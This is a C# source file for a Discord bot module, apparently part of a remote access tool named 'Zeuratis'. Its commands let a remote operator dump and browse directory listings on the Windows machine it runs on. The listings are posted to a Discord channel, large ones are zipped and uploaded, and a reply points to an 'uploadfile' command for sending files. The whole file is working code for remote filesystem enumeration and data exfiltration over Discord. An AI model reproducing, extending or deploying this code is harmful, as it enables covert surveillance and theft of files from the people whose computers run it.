namespace Zeuratis;

[SupportedOSPlatform("windows")]
public class DirectoryWalker : ModuleBase<SocketCommandContext>
{
    private static List<String> s_directories = new();
    private static readonly Dictionary<int, List<String>> s_dirRecord = new();
    private static readonly Dictionary<int, String> s_prevDir = new();
    private static int s_dirDepth = 0;

    [Command("DumpDirectory")]
    public async Task DumpDirectoryCmd(String dirPath, String searchPattern = "*.*", bool includeSubDirs = true)
    {
        s_prevDir.Clear();
        await DumpDirectory(dirPath, searchPattern, includeSubDirs);
    }

    [Command("WalkToDir")]
    public async Task WalkToDir(int field, int pos)
    {
        String path = s_dirRecord[field][pos];

        if (File.GetAttributes(path)
            .HasFlag(FileAttributes.Directory))
        {
            await DumpDirectory(path);
            s_prevDir.Add(s_dirDepth, Path.GetDirectoryName(path)!);
            s_dirDepth++;
        }
        else
        {
            await ReplyAsync(embed: new EmbedBuilder
            {
                Description = "The file selected is not a directory use ``>uploadfile [filepath]`` for this file to be zipped and sent"
            }.Build());
        }
    }

    [Command("PrevDir")]
    public async Task PrevDir()
    {
        if (s_dirDepth >= 1)
        {
            s_dirDepth--;
            await DumpDirectory(s_prevDir[s_dirDepth]);
            s_prevDir.Remove(s_dirDepth);
        }
        else
        {
            await ReplyAsync("No Previous Directory Saved");
        }
    }

    [Command("GetFullPath")]
    public async Task GetFullPath(int field, int pos)
    {
        await ReplyAsync(s_dirRecord[field][pos]);     
    }

    [Command("GetDirListBounds")]
    public async Task GetDirListBounds()
    {
        if (s_dirRecord.Count > 0)
        {
            int maxfield = s_dirRecord.Keys.Count - 1;
            int maxpos = s_dirRecord[maxfield].Count - 1;

            await ReplyAsync(embed: new EmbedBuilder
            {
                Description = "Max Values: ``" + maxfield + "`` : ``" + maxpos + "``\nMin Values: ``0 : 0``"
            }.Build());
        }
        else 
        {
            await ReplyAsync("No directory list saved");
        }
    }

    public async Task DumpDirectory(String dirPath, String searchPattern = "*.*", bool includeSubDirs = true)
    {
        s_dirRecord.Clear();
        EmbedBuilder embedBuilder = new();

        if (includeSubDirs)
        {
            s_directories = Directory.GetDirectories(dirPath).ToList();
        }

        s_directories.AddRange(Directory.GetFiles(dirPath, searchPattern).ToList());

        String paths = "";

        if (s_directories.Count >= 51)
        {
            await ReplyAsync("Large number of directories will be uploaded as a file");

            foreach (String path in s_directories)
            {
                paths += path + "\n";
            }
            File.WriteAllText("tempfile\\directory.txt", paths);
            ZipFile.CreateFromDirectory("tempfile", "directory.zip");

            await Context.Channel.SendFileAsync("directory.zip");
            File.Delete("directory.zip");

            Zeuratis.ClearTemp();
        }
        else
        {
            while (s_directories.Count % 4 != 0)
            {
                s_directories.Add(".");
            }

            int x = 0;
            for (int y = 0; y < s_directories.Count / 4; y++)
            {
                List<String> tempPath = new();
                for (int i = 0; i < 4; i++)
                {
                    int z = i + (x * 4);

                    paths += s_directories[z].Replace(dirPath + "\\", "") + "\n";

                    if (s_directories[z] != ".")
                    {
                        tempPath.Add(s_directories[z]);
                    }
                }

                s_dirRecord.Add(x, tempPath);
                x++;
                embedBuilder.AddField($"{y} ", paths);
                paths = "";
            }

            await ReplyAsync(embed: embedBuilder.Build());
        }
    }
}
